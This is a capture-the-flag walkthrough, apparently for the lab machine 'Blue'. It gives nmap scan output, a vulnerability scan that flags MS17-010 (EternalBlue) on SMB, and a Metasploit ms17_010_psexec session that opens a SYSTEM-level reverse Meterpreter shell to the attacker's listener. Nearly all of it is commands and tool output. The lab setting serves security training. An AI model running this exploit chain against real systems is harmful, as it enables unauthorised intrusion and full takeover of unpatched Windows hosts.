# Blue

## where you at

10.10.10.40

## what you got

```
# Nmap 7.80 scan initiated Thu Jan 23 16:56:13 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/blue/scans/full_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/blue/scans/full_tcp.gnmap 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.019s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/23%OT=135%CT=1%CU=32587%PV=Y%DS=2%DC=T%G=Y%TM=5E29C2
OS:95%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=I%CI=I%II=I%TS=7)SE
OS:Q(SP=101%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M54DNW8ST11%O2=M5
OS:4DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(
OS:W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%TG=80%W=200
OS:0%O=M54DNW8NNS%CC=N%Q=)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(
OS:R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=Y%DF=Y%TG=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%TG=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%TG=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T
OS:G=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=80%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%TG=80%CD=Z)IE(
OS:R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 43s, deviation: 2s, median: 42s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-01-23T15:58:49+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-01-23T15:58:50
|_  start_date: 2020-01-23T15:56:12

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   18.81 ms 10.10.14.1
2   19.07 ms 10.10.10.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 23 16:58:13 2020 -- 1 IP address (1 host up) scanned in 121.19 seconds
```

```
nmap -p 135,139,445,49152-49157 --script=vuln 10.10.10.40
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-23 17:08 CET
Nmap scan report for 10.10.10.40
Host is up (0.020s latency).

PORT      STATE SERVICE
135/tcp   open  msrpc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49152/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49155/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49156/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49157/tcp open  unknown
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 110.04 seconds
```

```
msf5 exploit(windows/smb/ms17_010_psexec) > set rhost 10.10.10.40
rhost => 10.10.10.40
msf5 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                10.10.10.40                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/ms17_010_psexec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   PowerShell
   2   Native upload
   3   MOF upload


msf5 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.23:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (180291 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.40:49158) at 2020-01-23 17:11:19 +0100

meterpreter > 
```
